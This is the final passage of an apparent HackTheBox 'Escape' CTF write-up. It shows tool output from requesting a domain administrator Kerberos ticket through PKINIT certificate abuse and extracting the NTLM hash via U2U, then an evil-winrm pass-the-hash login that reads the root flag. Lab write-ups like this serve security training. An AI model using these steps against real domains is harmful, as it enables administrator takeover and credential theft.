</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Using</span> <span class=n>PKINIT</span> <span class=n>with</span> <span class=n>etype</span> <span class=n>rc4_hmac</span> <span class=n>and</span> <span class=n>subject</span><span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>Ryan</span><span class=p>.</span><span class=n>Cooper</span><span class=p>,</span> <span class=n>CN</span><span class=p>=</span><span class=n>Users</span><span class=p>,</span> <span class=n>DC</span><span class=p>=</span><span class=n>sequel</span><span class=p>,</span> <span class=n>DC</span><span class=p>=</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Building</span> <span class=nb>AS-REQ</span> <span class=p>(</span><span class=n>w</span><span class=p>/</span> <span class=n>PKINIT</span> <span class=n>preauth</span><span class=p>)</span> <span class=k>for</span><span class=err>:</span> <span class=s1>&#39;sequel.htb\administrator&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Using</span> <span class=n>domain</span> <span class=n>controller</span><span class=err>:</span> <span class=n>fe80</span><span class=p>::</span><span class=mf>5438</span><span class=err>:</span><span class=n>a078</span><span class=err>:</span><span class=n>e66d</span><span class=err>:</span><span class=n>b560</span><span class=k>%</span><span class=mf>4</span><span class=err>:</span><span class=mf>88</span>
</span></span><span class=line><span class=cl><span class=p>[+]</span> <span class=n>TGT</span> <span class=n>request</span> <span class=n>successful</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>base64</span><span class=p>(</span><span class=n>ticket</span><span class=p>.</span><span class=n>kirbi</span><span class=p>)</span><span class=err>:</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Getting</span> <span class=n>credentials</span> <span class=n>using</span> <span class=n>U2U</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>CredentialInfo</span>         <span class=err>:</span>
</span></span><span class=line><span class=cl>    <span class=n>Version</span>              <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl>    <span class=n>EncryptionType</span>       <span class=err>:</span> <span class=n>rc4_hmac</span>
</span></span><span class=line><span class=cl>    <span class=n>CredentialData</span>       <span class=err>:</span>
</span></span><span class=line><span class=cl>      <span class=n>CredentialCount</span>    <span class=err>:</span> <span class=mf>1</span>
</span></span><span class=line><span class=cl>       <span class=n>NTLM</span>              <span class=err>:</span> <span class=p>&lt;</span><span class=n>NTLM</span> <span class=n>HASH</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.</p><p>I can use that with:</p><pre tabindex=0><code>$ evil-winrm -H &#34;&lt;NTLM HASH&gt;&#34; -u &#34;administrator&#34; -i 10.10.11.202
M* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
&lt;root_hash&gt;
</code></pre><h1 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h1><ul><li><a href=https://blog.zerospl0it.com/posts/Escape/>https://blog.zerospl0it.com/posts/Escape/</a></li><li><a href=https://yu8pentest.blogspot.com/2023/02/escape.html>https://yu8pentest.blogspot.com/2023/02/escape.html</a></li><li><a href=https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15>https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15</a></li><li><a href="https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape">https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape</a></li></ul></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>